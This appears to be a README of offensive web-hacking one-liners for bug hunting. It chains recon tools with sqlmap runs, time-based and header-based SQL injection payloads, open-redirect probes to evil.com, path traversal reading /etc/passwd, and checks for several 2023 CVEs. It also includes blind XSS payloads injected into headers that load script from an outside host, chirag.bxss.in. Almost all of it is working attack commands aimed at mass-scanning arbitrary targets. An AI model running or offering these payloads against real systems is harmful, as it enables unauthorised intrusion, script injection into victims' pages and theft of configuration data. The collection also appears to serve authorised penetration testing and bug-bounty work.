# One-Liner-Collections
This Repositories contains list of One Liners with Descriptions and Installation requirements

────────────────────────────────────────────────────────────────────────



# SQL Injection

## Installation Requirements
1. Subfinder   : https://github.com/projectdiscovery/subfinder 
2. GAU         : https://github.com/lc/gau
3. GF          : https://github.com/tomnomnom/gf
4. Findomain   : https://github.com/Findomain/Findomain
5. HTTPX       : https://github.com/projectdiscovery/httpx
6. Anew        : https://github.com/tomnomnom/anew
7. Waybackurls : https://github.com/tomnomnom/waybackurls
8. SQLiDetector: https://github.com/eslam3kl/SQLiDetector

## OneLiner
```
echo http://testphp.vulnweb.com | waybackurls > wayback_urls_for_target.txt ; python3 sqlidetector.py -f  wayback_urls_for_target.txt

```
```
subfinder -d http://TARGET.com -silent -all | gau - blacklist ttf,woff,svg,png | sort -u | gf sqli >gf_sqli.txt; sqlmap -m gf_sqli.txt --batch --risk 3 --random-agent | tee -a sqli_report.txt
```

```
findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1
```

```
cat urls.txt | grep ".php" | sed 's/\.php.*/.php\//' | sort -u | sed s/$/%27%22%60/ | while read url do ; do curl --silent "$url" | grep -qs "You have an error in your SQL syntax" && echo -e "$url \e[1;32mSQLI by Cybertix\e[0m" || echo -e "$url \e[1;31mNot Vulnerable to SQLI Injection\e[0m" ;done

```

### Header-Based Blind SQL injection

```
cat domain.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13'
```

### Time based SQL injection

1. apt install moreutils
2. apt install parallel

```
cat urls.txt | grep "=" | qsreplace "1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)" > blindsqli.txt
```

### Time based SQL injection using Waybackurls

```
waybackurls https://TARGET.COM | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt 
```
```
cat urls.txt | sed 's/=/=(CASE%20WHEN%20(888=888)%20THEN%20SLEEP(5)%20ELSE%20888%20END)/g' | xargs -I{} bash -c 'echo -e "\ntarget : {}\n" && time curl "'{}'"'
```
────────────────────────────────────────────────────────────────────────



# Open Redirection

## Installation Requirements
1. Waybackurls : https://github.com/tomnomnom/waybackurls
2. Bhedak      : https://github.com/R0X4R/bhedak
3. GAU         : https://github.com/lc/gau
4. GF          : https://github.com/tomnomnom/gf
5. QS-Replace  : https://github.com/tomnomnom/qsreplace
6. HTTPX       : https://github.com/projectdiscovery/httpx
7. Subfinder   : https://github.com/projectdiscovery/subfinder
8. Httprobe    : https://github.com/tomnomnom/httprobe
9. Nuclei      : https://github.com/projectdiscovery/nuclei

## OneLiner

```
waybackurls TARGET.COM | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I| grep "evil.com" && echo "$host \033[0;31mVulnerable\n" ;done
```

```
subfinder -dL domains.txt | httprobe |tee live_domain.txt; cat live_domain.txt | waybackurls | tee wayback.txt; cat wayback.txt | sort -u | grep "\?" > open.txt; nuclei -t Url-Redirection-Catcher.yaml -l open.txt
```

────────────────────────────────────────────────────────────────────────



# NGINX Path Traversal

## Installation Requirements
1. HTTPX : https://github.com/projectdiscovery/httpx


## OneLiner
```
httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'
```

────────────────────────────────────────────────────────────────────────



# Subdomain Takeover

## Installation Requirements
1. Subfinder    : https://github.com/projectdiscovery/subfinder 
2. Assetfinder  : https://github.com/tomnomnom/assetfinder
3. Amass        : https://github.com/OWASP/Amass
4. Subjack      : https://github.com/haccer/subjack


## OneLiner
```
subfinder -d HOST >> FILE; assetfinder --subs-only HOST >> FILE; amass enum -norecursive -noalts -d HOST >> FILE; subjack -w FILE -t 100 -timeout 30 -ssl -c $GOPATH/src/github.com/cybertix/subjack/fingerprints.json -v 3 >> takeover ;
```

────────────────────────────────────────────────────────────────────────



# Extract URLs from Source Code

## OneLiner
```
curl "https://TARGET.Com" | grep -oP '(https*.//|www\.)[^]*'
```


────────────────────────────────────────────────────────────────────────



# XSS (Cross-Site Scripting)

## Installation Requirements
1. Katana       : https://github.com/projectdiscovery/katana
2. Dalfox       : https://github.com/hahwul/dalfox
3. Waybackurls  : https://github.com/tomnomnom/waybackurls
4. GF           : https://github.com/tomnomnom/gf
5. Dalfox       : https://github.com/hahwul/dalfox
6. HTTPX      : https://github.com/projectdiscovery/httpx


## OneLiner
```
echo http://testphp.vulnweb.com | katana -jc -f qurl -d 5 -c 50 -kf robotstxt,sitemapxml -silent | dalfox pipe --skip-bav
```

```
waybackurls http://testphp.vulnweb.com | gf xss | sed 's/=.*/=/' | sort -u | tee XSS.txt && cat XSS.txt | dalfox -b http://chirag.bxss.in pipe > output.txt
```

```
cat http://target.com | gau --subs | grep "https://" | grep -v "png\|jpg\|css\|js\|gif\|txt" | grep "=" | uro | dalfox pipe --deep-domxss --multicast --blind https://chirag.bxss.in
```

### Blind XSS Mass Hunting

```
cat domain.txt | waybackurls | httpx -H "User-Agent: \"><script src=https://chirag.bxss.in></script>"
```
────────────────────────────────────────────────────────────────────────



# Find Endpoints in JS

## Installation Requirements
1. Katana    : https://github.com/projectdiscovery/katana
2. Anew      : https://github.com/tomnomnom/anew


## OneLiner
```
katana -u http://testphp.vulnweb.com -js-crawl -d 5 -hl -filed endpoint | anew endpoint.txt
```

────────────────────────────────────────────────────────────────────────

# OneLiner for CVE-2023-23752 - 𝙅𝙤𝙤𝙢𝙡𝙖 𝙄𝙢𝙥𝙧𝙤𝙥𝙚𝙧 𝘼𝙘𝙘𝙚𝙨𝙨 𝙘𝙝𝙚𝙘𝙠 𝙞𝙣 𝙒𝙚𝙗𝙨𝙚𝙧𝙫𝙞𝙘𝙚 𝙀𝙣𝙙𝙥𝙤𝙞𝙣𝙩

## Installation Requirements
1. Subfinder  : https://github.com/projectdiscovery/subfinder
2. HTTPX      : https://github.com/projectdiscovery/httpx

## OneLiner
```
subfinder -d http://TARGET.COM -silent -all | httpx -silent -path 'api/index.php/v1/config/application?public=true' -mc 200
```

────────────────────────────────────────────────────────────────────────

# cPanel CVE-2023-29489 XSS One-Liner

## Installation Requirements
1. Subfinder  : https://github.com/projectdiscovery/subfinder
2. HTTPX      : https://github.com/projectdiscovery/httpx

## OneLiner
```
subfinder -d http://example.com -silent -all | httpx -silent -ports http:80,https:443,2082,2083 -path '/cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">aaaaaaaaaaaaaaa' -mc 400
```

────────────────────────────────────────────────────────────────────────

# WP-Config Oneliner

## Installation Requirements
1. Subfinder  : https://github.com/projectdiscovery/subfinder
2. HTTPX      : https://github.com/projectdiscovery/httpx

## OneLiner
```
subfinder -silent -d TARGET.com | httpx -silent -nc -p 80,443,8080,8443,9000,9001,9002,9003,8088 -path "/wp-config.PHP" -mc 200 -t 60 -status-code
```

────────────────────────────────────────────────────────────────────────

# JS Secret Finder Oneliner

## Installation Requirements
1. Gau         : https://github.com/lc/gau
2. HTTPX       : https://github.com/projectdiscovery/httpx
3. Nuclei      : https://github.com/projectdiscovery/nuclei

## OneLiner
```
echo TARGET.com | gau | grep ".js" | httpx -content-type | grep 'application/javascript' | awk '{print $1}' | nuclei -t /root/nuclei-templates/exposures/ -silent > secrets.txt
```

────────────────────────────────────────────────────────────────────────

# Memory dump and env disclosure

## Installation Requirements
1. Shodan      : https://www.shodan.io

## OneLiner
```
shodan search org: "Target" http.favicon.hash:116323821 --fields ip_str,port--separator | awk '{print $1 $2}'
```

────────────────────────────────────────────────────────────────────────

# Easiest Information Disclosure in JSON body

## Installation Requirements
1. Waybackurls  : https://github.com/tomnomnom/waybackurls
2. HTTPX       : https://github.com/projectdiscovery/httpx

## OneLiner
```
cat subdomains.txt | waybackurls | httpx -mc 200 -ct | grep application/json
```

────────────────────────────────────────────────────────────────────────

# Fuzz with 127.0.0.1 as Host header 

## Installation Requirements
1. FFUF  : https://github.com/ffuf/ffuf

## OneLiner
```
ffuf -u https://target[.]com/FUZZ -H “Host: 127.0.0.1” -w /home/user/path/to/wordlist.txt -fs <regular_content_length>
```

────────────────────────────────────────────────────────────────────────

# CVE-2023-0126 Pre-authentication path traversal vulnerability in SMA1000

## OneLiner
```
cat file.txt| while read host do;do curl -sk "http://$host:8443/images//////////////////../../../../../../../../etc/passwd" | grep -i 'root:' && echo $host "is VULN";done
```

────────────────────────────────────────────────────────────────────────

# Get Favicon Hash of your target Domain

## OneLiner
```
curl -s -L -k https://TARGET.COM/favicon.ico | python3 -c 'import mmh3, sys, codecs; print(mmh3.hash(codecs.encode(sys.stdin.buffer.read(),"base64")))'
```

────────────────────────────────────────────────────────────────────────

# CVE-2023-22515 One Liner Confluence Data Center & Server: Privilege Escalation

## OneLiner
```
cat file.txt | while read host do; do curl -skL "http://$host/setup/setupadministrator.action" | grep -i "<title>Setup System Administrator" && echo $host "Vulnerable"; done
```

────────────────────────────────────────────────────────────────────────

# CVE-2023-22518 - Improper Authorization Vulnerability in Confluence Data Center and Server

## OneLiner
```
subfinder -d TARGET.COM -silent | httpx -silent | nuclei -t CVE-2023-22518.yaml
```

────────────────────────────────────────────────────────────────────────

# Extract Sensitive Informations on /auth.json Endpoint.

## OneLiner
```
subfinder -d TARGET.COM | httpx -path "/auth.json" -title -status-code -content-length -t 80 -p 80,443,8080,8443,9000,9001,9002,9003
```

────────────────────────────────────────────────────────────────────────

# Use xargs with gau to scan bulk domains without losing speed .

## Installation Requirements
1. GAU         : https://github.com/lc/gau

## OneLiner
```
xargs -a alive.txt -I@ sh -c 'gau --blacklist css,jpg,jpeg,JPEG,ott,svg,js,ttf,png,woff2,woff,eot,gif "@"' | tee -a gau.txt
```

────────────────────────────────────────────────────────────────────────

# Blind XSS In X-Forwarded-For Header.

## Installation Requirements
1. BXSS         : https://github.com/ethicalhackingplayground/bxss
2. GAU          : https://github.com/lc/gau
3. Findomain    : https://github.com/Findomain/Findomain

## OneLiner
```
findomain -t TARGET.COM | gau | bxss -payload '"><script src=https://chirag.bxss.in></script>' -header "X-Forwarded-For"
```
